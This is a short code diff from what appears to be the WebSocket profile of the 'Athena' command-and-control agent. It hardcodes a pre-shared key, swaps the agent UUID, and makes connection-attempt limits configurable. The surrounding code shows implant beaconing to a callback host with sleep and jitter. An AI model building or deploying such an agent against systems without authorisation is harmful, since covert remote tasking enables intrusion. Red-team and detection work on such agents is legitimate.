@@ -44,13 +44,13 @@ namespace Athena
             this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
             this.userAgent = "";
             this.hostHeader = "";
-            this.psk = "";
+            this.psk = "KdMlU0mqlqoYHV5sr4yQCfJGO3Uib2uQyMblDKiNdrE=";
             this.encryptedExchangeCheck = bool.Parse("false");
             int sleep = int.TryParse("3", out sleep) ? sleep : 60;
             this.sleep = sleep;
             int jitter = int.TryParse("3", out jitter) ? jitter : 10;
             this.jitter = jitter;
-            this.uuid = "fd050dd6-ed20-45a6-90f5-1ef9d6a1caa6";
+            this.uuid = "eb53d24b-ae9f-4737-b8df-de8df3ed748b";
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(this.uuid, this.psk);
@@ -69,6 +69,10 @@ namespace Athena
             this.cts = new CancellationTokenSource();
             while (!cts.Token.IsCancellationRequested)
             {
+                if (this.currentAttempt > this.maxAttempts)
+                {
+                    Environment.Exit(0);
+                }
                 await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
                 Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                 Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
@@ -155,7 +159,7 @@ namespace Athena
 
                 while (ws.State != WebSocketState.Open)
                 {
-                    if (this.connectAttempts == 300)
+                    if (this.connectAttempts == this.maxAttempts)
                     {
                         Environment.Exit(0);
                     }
